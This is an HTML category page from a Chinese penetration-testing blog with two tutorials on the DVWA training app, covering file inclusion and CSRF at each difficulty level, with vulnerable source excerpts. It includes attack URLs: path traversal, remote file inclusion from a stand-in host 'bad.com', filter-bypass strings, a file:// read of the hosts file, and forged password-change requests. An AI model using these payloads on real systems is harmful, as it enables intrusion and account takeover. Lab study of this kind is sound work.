@@ -1,0 +1,141 @@
+<!doctype html>
+<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="robots" content="noindex"><meta><title>分类: penetration Test - toBePenTester</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="toBePenTester"><meta name="msapplication-TileImage" content="/img/favicon.svg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="toBePenTester"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="cyhfvg&amp;#39;s Blog."><meta property="og:type" content="blog"><meta property="og:title" content="toBePenTester"><meta property="og:url" content="https://cyhfvg.github.io/"><meta property="og:site_name" content="toBePenTester"><meta property="og:description" content="cyhfvg&amp;#39;s Blog."><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://cyhfvg.github.io/img/og_image.png"><meta property="article:author" content="cyhfvg"><meta property="article:tag" content="cyhfvg blog"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://cyhfvg.github.io"},"headline":"toBePenTester","image":["https://cyhfvg.github.io/img/og_image.png"],"author":{"@type":"Person","name":"cyhfvg"},"publisher":{"@type":"Organization","name":"toBePenTester","logo":{"@type":"ImageObject","url":{"text":"I wanna be the guy."}}},"description":"cyhfvg&#39;s Blog."}</script><link rel="icon" href="/img/favicon.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.2/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script><meta name="generator" content="Hexo 5.4.2"></head><body class="is-3-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/">I wanna be the guy.</a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">归档</a><a class="navbar-item" href="/categories">分类</a><a class="navbar-item" href="/tags">标签</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/cyhfvg"><i class="fab fa-github"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-9-widescreen"><div class="card"><div class="card-content"><nav class="breadcrumb" aria-label="breadcrumbs"><ul><li><a href="/categories">分类</a></li><li class="is-active"><a href="#" aria-current="page">penetration Test</a></li></ul></nav></div></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-11-20T08:59:56.000Z" title="11/20/2021, 4:59:56 PM">2021-11-20</time>发表</span><span class="level-item"><time dateTime="2021-11-20T08:59:56.000Z" title="11/20/2021, 4:59:56 PM">2021-11-20</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/penetration-Test/">penetration Test</a><span> / </span><a class="link-muted" href="/categories/penetration-Test/train/">train</a></span><span class="level-item">4 分钟读完 (大约578个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/something-about-DVWA-File-Inclusion/">something about DVWA - File Inclusion</a></h1><div class="content"><h1 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h1><p><a target="_blank" rel="noopener" href="https://github.com/digininja/DVWA">DVWA</a>    =&gt; <a target="_blank" rel="noopener" href="https://github.com/to-be-the-one/DVWA">备份地址</a></p>
+<h2 id="File-Inclusion-文件包含"><a href="#File-Inclusion-文件包含" class="headerlink" title="File Inclusion(文件包含)"></a>File Inclusion(文件包含)</h2><p><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/File_inclusion_vulnerability">文件包含</a></p>
+<p>php配置允许<code>allow_url_include</code>时允许文件包含，配置允许<code>allow_url_fopen</code>时允许包含远程文件。</p>
+<h3 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h3><ul>
+<li><p>手工测试</p>
+<ul>
+<li><p>本地文件包含</p>
+<p>  dvwa文件包含为此URL:<code>http://train.com/dvwa/vulnerabilities/fi/?page=include.php</code>,尝试替换<code>include.php</code>包含
+  本地敏感文件。</p>
+<p>  <code>http://train.com/dvwa/vulnerabilities/fi/?page=C:\xampp\htdocs\DVWA\robots.txt</code></p>
+<p>  <code>http://train.com/dvwa/vulnerabilities/fi/?page=..\..\robots.txt</code></p>
+</li>
+<li><p>远程文件包含</p>
+<p>  将远程恶意文件url传递给dvwa。</p>
+<p>  <code>http://train.com/dvwa/vulnerabilities/fi/?page=http://bad.com/bad.php</code></p>
+</li>
+</ul>
+</li>
+<li><p><em><strong>源码分析</strong></em></p>
+<p>  直接在<code>request</code>中获取文件名，直接进行包含。</p>
+  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;page&#x27;</span> ];</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h3><ul>
+<li><p>手工测试</p>
+<p>  <code>str_replace</code>只会过滤一次，因此可以使用 <strong>重复构造</strong> 的方法( <strong>双写</strong> )进行绕过。</p>
+<p>  想要构造<code>http://</code>,因此构造<code>httphttp://://</code>，这样<code>http://</code>被过滤掉后，剩余的字符组合成 <em>目标字符串</em> 。<br>
+  同样的，想要构造<code>../</code>，因此构造<code>..././</code>。</p>
+<p>  构造后的漏洞利用url为:</p>
+<p>  <code>http://train.com/dvwa/vulnerabilities/fi/?page=httphttp://://bad.com/bad.php</code></p>
+<p>  <code>http://train.com/dvwa/vulnerabilities/fi/?page=..././..././robots.txt</code></p>
+</li>
+<li><p><em><strong>源码分析</strong></em></p>
+<p>  从<code>request</code>中获取文件名后，使用<code>str_replace</code>将其中的敏感字串过滤掉。</p>
+  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Input validation</span></span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>( <span class="keyword">array</span>( <span class="string">&quot;http://&quot;</span>, <span class="string">&quot;https://&quot;</span> ), <span class="string">&quot;&quot;</span>, <span class="variable">$file</span> );</span><br><span class="line"><span class="string">&quot;file = str_replace( array( &quot;</span>../<span class="string">&quot;, &quot;</span>..\\<span class="string">&quot; ), &quot;</span><span class="string">&quot;, <span class="subst">$file</span> );</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="High"><a href="#High" class="headerlink" title="High"></a>High</h3><ul>
+<li><p>手工测试</p>
+<p>  由于强制要求文件名以<code>file</code>开头，可以使用<code>File协议</code>绕过判断。<code>File协议</code>为<code>本地文件传输协议</code>,
+  因此需要配合<code>文件上传</code>漏洞使用,将恶意文件上传至目标服务器，再使用<code>File协议</code>指定目标文件。</p>
+<p>  <code>File协议</code>使用:</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file://path/to/file</span><br></pre></td></tr></table></figure>
+
+<p>  使用<code>File协议</code>后指定包含文件:</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://train.com/dvwa/vulnerabilities/fi/?page=file://C:\Windows\System32\drivers\etc\hosts</span><br></pre></td></tr></table></figure></li>
+<li><p><em><strong>源码分析</strong></em></p>
+<p>  从<code>request</code>中获取文件名后，判断其是否为固定字符开头(<code>以file开头</code>)。</p>
+  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Input validation</span></span><br><span class="line"><span class="keyword">if</span>( !<span class="title function_ invoke__">fnmatch</span>( <span class="string">&quot;file*&quot;</span>, <span class="variable">$file</span> ) &amp;&amp; <span class="variable">$file</span> != <span class="string">&quot;include.php&quot;</span> ) &#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h3><ul>
+<li><p><em><strong>源码分析</strong></em></p>
+<p>  从<code>request</code>中获取文件名后，判断其是否在允许包含的文件列表中。</p>
+  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Only allow include.php or file&#123;1..3&#125;.php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$file</span> != <span class="string">&quot;include.php&quot;</span> &amp;&amp; <span class="variable">$file</span> != <span class="string">&quot;file1.php&quot;</span> &amp;&amp; <span class="variable">$file</span> != <span class="string">&quot;file2.php&quot;</span> &amp;&amp; <span class="variable">$file</span> != <span class="string">&quot;file3.php&quot;</span> ) &#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ul>
+</div><hr style="height:1px;margin:1rem 0"><div class="level is-mobile is-flex"><div class="article-tags is-size-7 is-uppercase"><i class="fas fa-tags has-text-grey"></i> <a class="link-muted" rel="tag" href="/tags/dvwa/">dvwa, </a><a class="link-muted" rel="tag" href="/tags/file-inclusion/">file inclusion </a></div></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-11-17T23:27:23.000Z" title="11/18/2021, 7:27:23 AM">2021-11-18</time>发表</span><span class="level-item"><time dateTime="2021-11-17T23:27:23.000Z" title="11/18/2021, 7:27:23 AM">2021-11-18</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/penetration-Test/">penetration Test</a><span> / </span><a class="link-muted" href="/categories/penetration-Test/train/">train</a></span><span class="level-item">4 分钟读完 (大约606个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/something-about-DVWA-CSRF/">something about DVWA - CSRF</a></h1><div class="content"><h1 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h1><p><a target="_blank" rel="noopener" href="https://github.com/digininja/DVWA">DVWA</a>    =&gt; <a target="_blank" rel="noopener" href="https://github.com/to-be-the-one/DVWA">备份地址</a></p>
+<h2 id="CSRF-跨站请求伪造"><a href="#CSRF-跨站请求伪造" class="headerlink" title="CSRF(跨站请求伪造)"></a>CSRF(跨站请求伪造)</h2><p><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Cross-site_request_forgery">跨站请求伪造</a>(<code>Cross-site request forgery</code>),也被称作<code>one-click attack</code>。<br></p>
+<p>用来挟持用户在当前已登录的Web应用程序上执行非本意的操作。</p>
+<p>CSRF访问原理:</p>
+<p><img src="https://cyhfvg-images.oss-cn-shanghai.aliyuncs.com/8dc9038b978d7bb5339fe6ec61943f75.jpg" alt="CSRF访问模型" title="用户正常访问模型与CSRF访问模型"></p>
+<h3 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h3><ul>
+<li><p>手工测试</p>
+<p>  直接在已经登录成功，身份认证未失效的浏览器上访问以下url即可更改当前用户的密码。</p>
+  <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://train.com/dvwa/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#</span><br></pre></td></tr></table></figure></li>
+<li><p><em><strong>源码分析</strong></em></p>
+<ul>
+<li><p>直接从<code>request</code>中获取参数</p>
+  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Get input</span></span><br><span class="line"><span class="variable">$pass_new</span>  = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line"><span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br></pre></td></tr></table></figure></li>
+<li><p>新密码与确认密码相同即更新数据库</p>
+<p>  使用<code>mysqli_real_escape_string</code>函数转义特殊字符，防止sql注入。
+  然后将密码使用<code>md5</code>加密后入库。</p>
+  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 转义特殊字符</span></span><br><span class="line"><span class="variable">$pass_new</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_new</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"><span class="variable">$pass_new</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass_new</span> );</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+</ul>
+<h3 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h3><ul>
+<li><p>手工测试</p>
+<p>  与<code>Low</code>级别相同。</p>
+<p>  不同的是构造的http请求需要包含<code>Referer</code>字段,用来验证url来源。</p>
+  <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://train.com/dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change</span><br></pre></td></tr></table></figure></li>
+<li><p><em><strong>源码分析</strong></em></p>
+<ul>
+<li><p>判断请求来源页面是否为本系统页面。</p>
+  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Checks to see where the request came from</span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">stripos</span>( <span class="variable">$_SERVER</span>[ <span class="string">&#x27;HTTP_REFERER&#x27;</span> ] ,<span class="variable">$_SERVER</span>[ <span class="string">&#x27;SERVER_NAME&#x27;</span> ]) !== <span class="literal">false</span> ) &#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>  其它与<code>Low</code>级别相同。</p>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="High"><a href="#High" class="headerlink" title="High"></a>High</h3><ul>
+<li><p>手工测试</p>
+<p>  与<code>Medium</code>级别相同。</p>
+<p>  不同的是构造的http请求需要包含页面上隐藏的<code>token</code>参数。(与XSS配合)</p>
+  <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://train.com/dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change&amp;user_token=253d1f2fad7d8c82627b1c356102ad4b#</span><br></pre></td></tr></table></figure></li>
+<li><p><em><strong>源码分析</strong></em></p>
+<ul>
+<li><p>使用<code>token</code>验证身份</p>
+  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Check Anti-CSRF token</span></span><br><span class="line"><span class="title function_ invoke__">checkToken</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br></pre></td></tr></table></figure>
+
+<p>  其它与<code>Low</code>级别相同。</p>
+</li>
+<li><p>最后重新生成<code>token</code></p>
+  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line"><span class="title function_ invoke__">generateSessionToken</span>();</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+</ul>
+<h3 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h3><ul>
+<li><p><em><strong>源码分析</strong></em></p>
+<ul>
+<li><p>使用<code>token</code>验证身份</p>
+<p>  与<code>High</code>级别相同。</p>
+</li>
+<li><p>验证当前用户存在</p>
+<p>  验证当前用户当前密码是否正确。</p>
+  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Check that the current password is correct</span></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>( <span class="string">&#x27;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#x27;</span> );</span><br><span class="line"><span class="variable">$data</span>-&gt;<span class="title function_ invoke__">bindParam</span>( <span class="string">&#x27;:user&#x27;</span>, <span class="title function_ invoke__">dvwaCurrentUser</span>(), PDO::<span class="variable constant_">PARAM_STR</span> );</span><br><span class="line"><span class="variable">$data</span>-&gt;<span class="title function_ invoke__">bindParam</span>( <span class="string">&#x27;:password&#x27;</span>, <span class="variable">$pass_curr</span>, PDO::<span class="variable constant_">PARAM_STR</span> );</span><br><span class="line"><span class="variable">$data</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br></pre></td></tr></table></figure>
+
+<p>  其它与<code>High</code>相同。</p>
+</li>
+</ul>
+</li>
+</ul>
+</div><hr style="height:1px;margin:1rem 0"><div class="level is-mobile is-flex"><div class="article-tags is-size-7 is-uppercase"><i class="fas fa-tags has-text-grey"></i> <a class="link-muted" rel="tag" href="/tags/CSRF/">CSRF, </a><a class="link-muted" rel="tag" href="/tags/dvwa/">dvwa </a></div></div></article></div><nav class="pagination" role="navigation" aria-label="pagination"><div class="pagination-previous"><a href="/categories/penetration-Test/page/17/">上一页</a></div><div class="pagination-next"><a href="/categories/penetration-Test/page/19/">下一页</a></div><ul class="pagination-list is-hidden-mobile"><li><a class="pagination-link" href="/categories/penetration-Test/">1</a></li><li><span class="pagination-ellipsis">&hellip;</span></li><li><a class="pagination-link" href="/categories/penetration-Test/page/17/">17</a></li><li><a class="pagination-link is-current" href="/categories/penetration-Test/page/18/">18</a></li><li><a class="pagination-link" href="/categories/penetration-Test/page/19/">19</a></li><li><a class="pagination-link" href="/categories/penetration-Test/page/20/">20</a></li><li><a class="pagination-link" href="/categories/penetration-Test/page/21/">21</a></li></ul></nav></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1 is-sticky"><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2023/12/"><span class="level-start"><span class="level-item">十二月 2023</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/11/"><span class="level-start"><span class="level-item">十一月 2023</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/09/"><span class="level-start"><span class="level-item">九月 2023</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/08/"><span class="level-start"><span class="level-item">八月 2023</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/05/"><span class="level-start"><span class="level-item">五月 2022</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/02/"><span class="level-start"><span class="level-item">二月 2022</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/01/"><span class="level-start"><span class="level-item">一月 2022</span></span><span class="level-end"><span class="level-item tag">6</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/12/"><span class="level-start"><span class="level-item">十二月 2021</span></span><span class="level-end"><span class="level-item tag">19</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/11/"><span class="level-start"><span class="level-item">十一月 2021</span></span><span class="level-end"><span class="level-item tag">11</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/10/"><span class="level-start"><span class="level-item">十月 2021</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/05/"><span class="level-start"><span class="level-item">五月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/03/"><span class="level-start"><span class="level-item">三月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><!--!--></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/">I wanna be the guy.</a><p class="is-size-7"><span>&copy; 2023 cyhfvg</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/cyhfvg"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("zh-CN");</script><script>var IcarusThemeSettings = {
+            article: {
+                highlight: {
+                    clipboard: true,
+                    fold: 'unfolded'
+                }
+            }
+        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
+            if (typeof $.fn.lightGallery === 'function') {
+                $('.article').lightGallery({ selector: '.gallery-item' });
+            }
+            if (typeof $.fn.justifiedGallery === 'function') {
+                if ($('.justified-gallery > p > .gallery-item').length) {
+                    $('.justified-gallery > p > .gallery-item').unwrap();
+                }
+                $('.justified-gallery').justifiedGallery();
+            }
+        });</script><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
+            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
+        });</script></body></html>
